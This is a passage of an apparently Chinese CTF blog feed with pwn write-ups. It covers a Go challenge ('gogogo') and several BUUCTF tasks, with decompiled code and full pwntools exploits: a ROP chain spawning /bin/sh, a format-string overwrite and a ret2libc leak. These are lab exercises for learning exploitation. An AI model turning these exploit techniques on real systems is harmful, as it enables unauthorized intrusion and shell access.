class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.main</span></span><br><span class="line">void __cdecl main_main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> char *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  _QWORD v9[<span class="number">2</span>]; <span class="comment">// [rsp+68h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>LL;</span><br><span class="line">  v2 = <span class="number">0</span>LL;</span><br><span class="line">  v3 = <span class="number">0</span>LL;</span><br><span class="line">  while ( v1 &lt; <span class="number">1000000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v1;                                    <span class="comment">// v7 v1是计数器</span></span><br><span class="line">    v8 = v3;</span><br><span class="line">    runtime_convT64(v1);</span><br><span class="line">    fmt_Sprintf(v0);</span><br><span class="line">    runtime_concatstring2(<span class="number">0</span>LL, v8);             <span class="comment">// 字符串拼接</span></span><br><span class="line">    v2 = v6;</span><br><span class="line">    v3 = v5;</span><br><span class="line">    v1 = v7 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = runtime_convTstring(v3, v2);             <span class="comment">// 将某个类型转换为字符串类型</span></span><br><span class="line">  v9[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">  v9[<span class="number">1</span>] = v4;</span><br><span class="line">  fmt_Fprintln(go_itab__ptr_os_File_comma_io_Writer, os_Stdout, v9, <span class="number">1</span>LL, <span class="number">1</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是显然ida里的反汇编总是那么出人意料</p><p>首先能一眼看出的是他调用了</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2020虎符ctf-gogogo"><a href="#2020虎符ctf-gogogo" class="headerlink" title="2020虎符ctf -gogogo"></a>2020虎符ctf -gogogo</h2><p>这道题的核心主要是它修改了main函数的名称为<code>math_init</code>，我是通过IDA远程调试调出来的</p><p>注意点：</p><ol><li>go的ida远程调试要下断点，因为go是多线程的，不下断点容易出问题</li><li>go一定要调试，静态分析容易出问题</li><li>go要看汇编，反汇编因为寄存器和栈值得反复交换，使得他的机制很奇怪</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./gogogo&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;120.25.148.180&quot;, 29561)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gogogo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_cnt</span>(<span class="params">k</span>):</span><br><span class="line"><span class="keyword">if</span> k == <span class="number">7</span> :</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x54749110</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;b *0x491ea1&#x27;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">num_list = []</span><br><span class="line">io.recvuntil(<span class="string">&quot;GUESS\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">x = <span class="number">2</span>*cnt</span><br><span class="line">y = <span class="number">2</span>*cnt+<span class="number">1</span></span><br><span class="line">io.sendline(<span class="string">F&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;x&#125;</span> <span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">cnt = cnt + <span class="number">1</span></span><br><span class="line">res = io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="string">b&quot;0A0B&quot;</span> :</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;0A1B&quot;</span> :</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;0A2B&quot;</span> :</span><br><span class="line">num_list.append(x)</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;1A0B&quot;</span> :</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;1A1B&quot;</span> :</span><br><span class="line">num_list.append(x)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;1A2B&quot;</span> :</span><br><span class="line">num_list.append(x)</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">elif</span> res == <span class="string">b&quot;2A1B&quot;</span> :</span><br><span class="line">num_list.append(x)</span><br><span class="line">num_list.append(y)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(num_list) == <span class="number">4</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">str</span>(num_list[<span class="number">0</span>]))</span><br><span class="line">info(<span class="built_in">str</span>(num_list[<span class="number">1</span>]))</span><br><span class="line">info(<span class="built_in">str</span>(num_list[<span class="number">2</span>]))</span><br><span class="line">info(<span class="built_in">str</span>(num_list[<span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line">idx = -<span class="number">1</span></span><br><span class="line">pos = [-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">idx = idx + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> idx == <span class="number">4</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">x = num_list[idx]</span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> times == (<span class="number">3</span> - idx) :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> pos[i] == -<span class="number">1</span> :</span><br><span class="line">pos[i] = idx</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> pos[<span class="number">0</span>] == -<span class="number">1</span> :</span><br><span class="line">io.sendline(<span class="string">F&quot;<span class="subst">&#123;x&#125;</span> -1 -1 -1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">times = times + <span class="number">1</span></span><br><span class="line">cnt = cnt + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> judge_cnt(cnt) :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="string">b&quot;1A0B&quot;</span> :</span><br><span class="line">pos[<span class="number">0</span>] = idx</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> times == (<span class="number">3</span> - idx) :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> pos[i] == -<span class="number">1</span> :</span><br><span class="line">pos[i] = idx</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> pos[<span class="number">1</span>] == -<span class="number">1</span> :</span><br><span class="line">io.sendline(<span class="string">F&quot;-1 <span class="subst">&#123;x&#125;</span> -1 -1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">times = times + <span class="number">1</span></span><br><span class="line">cnt = cnt + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> judge_cnt(cnt) :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="string">b&quot;1A0B&quot;</span> :</span><br><span class="line">pos[<span class="number">1</span>] = idx</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> times == (<span class="number">3</span> - idx) :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> pos[i] == -<span class="number">1</span> :</span><br><span class="line">pos[i] = idx</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> pos[<span class="number">2</span>] == -<span class="number">1</span> :</span><br><span class="line">io.sendline(<span class="string">F&quot;-1 -1 <span class="subst">&#123;x&#125;</span> -1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">times = times + <span class="number">1</span></span><br><span class="line">cnt = cnt + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> judge_cnt(cnt) :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="string">b&quot;1A0B&quot;</span> :</span><br><span class="line">pos[<span class="number">2</span>] = idx</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> times == (<span class="number">3</span> - idx) :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> pos[i] == -<span class="number">1</span> :</span><br><span class="line">pos[i] = idx</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = io.recv(timeout = <span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;TRY AGAIN?&quot;</span> <span class="keyword">in</span> res :</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">io.sendline(<span class="string">F&quot;<span class="subst">&#123;num_list[pos[<span class="number">0</span>]]&#125;</span> <span class="subst">&#123;num_list[pos[<span class="number">1</span>]]&#125;</span> <span class="subst">&#123;num_list[pos[<span class="number">2</span>]]&#125;</span> <span class="subst">&#123;num_list[pos[<span class="number">3</span>]]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># WIN</span></span><br><span class="line">res = io.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;WIN&quot;</span> <span class="keyword">in</span> res :</span><br><span class="line">success(<span class="string">&quot;Win!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">info(<span class="string">&quot;Wrong?&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;EXIT?\n&quot;</span>, <span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;(4) EXIT\n&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b *0x494B0F&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdx_ret = <span class="number">0x48546c</span></span><br><span class="line">pop_rax_ret = <span class="number">0x405b78</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x41c41c</span></span><br><span class="line">syscall_ret = <span class="number">0x45c849</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x44dbe3</span></span><br><span class="line">mov_val_rax_rcx_ret = <span class="number">0x42b353</span> <span class="comment"># mov qword ptr [rax], rcx; ret;</span></span><br><span class="line">xchg_rax_r9_ret = <span class="number">0x45b367</span></span><br><span class="line">mov_rdi_r9 = <span class="number">0x410d24</span> <span class="comment"># mov rdi, r9; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;</span></span><br><span class="line">pause()</span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b *0x405b78&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x460</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(elf.bss())</span><br><span class="line">payload += p64(pop_rcx_ret)</span><br><span class="line">payload += p64(<span class="number">0x68732f6e69622f</span>)</span><br><span class="line">payload += p64(mov_val_rax_rcx_ret)</span><br><span class="line">payload += p64(xchg_rax_r9_ret)</span><br><span class="line">payload += p64(mov_rdi_r9)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;SURE?\n&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>首先是爆破游戏，然后给溢出，细看：<a href="https://www.cnblogs.com/winmt/articles/16036535.html">winmt师傅</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GO-PWN&quot;&gt;&lt;a href=&quot;#GO-PWN&quot; class=&quot;headerlink&quot; title=&quot;GO-PWN&quot;&gt;&lt;/a&gt;GO-PWN&lt;/h1&gt;&lt;p&gt;首先go的二进制文件分析与C&amp;#x2F;C++二进制文件分析大有不同，有些老东西都不能运用得当&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Go-pwn" scheme="http://s1nec-1o.github.io/categories/Go-pwn/"/>
    
    
    <category term="go" scheme="http://s1nec-1o.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>buu做题记录</title>
    <link href="http://s1nec-1o.github.io/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://s1nec-1o.github.io/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2024-03-11T15:00:19.000Z</published>
    <updated>2024-04-28T14:12:11.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="buu做题记录1"><a href="#buu做题记录1" class="headerlink" title="buu做题记录1"></a>buu做题记录1</h1><p>算是最近得做题记录了，就是一开始的比较简单呃就挺简洁的，所以后面跳到5，6页了，算是总结吧，之后也不知道要干什么，就这样子吧</p><h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211039.png" alt="image-20240303211815707" style="zoom:50%;" /><p>可以看到有格式字符串漏洞，原本因为1想的是password会在栈上出现，但是并没有应该是被覆盖掉了，因此我们想到直接修改password</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211040.png" alt="image-20240303211726790" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn5&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27277</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">pal=p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)+<span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf-2019-babyheap"></a>rctf-2019-babyheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )                      <span class="comment">// &#x27;\0&#x27;绕过</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br></pre></td></tr></table></figure><p>本题主要是栈溢出，然后有个加密要绕过，因此先传入’\0’绕过strlen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">poprid_ret=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">overflow(p64(poprid_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Ciphertext\n\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">overflow(p64(ret)+p64(p64(poprid_ret)+p64(binsh_addr)+p64(system_addr)))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>但是不知道为什么我的libcsearcher一直用不了，所以用网上找的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 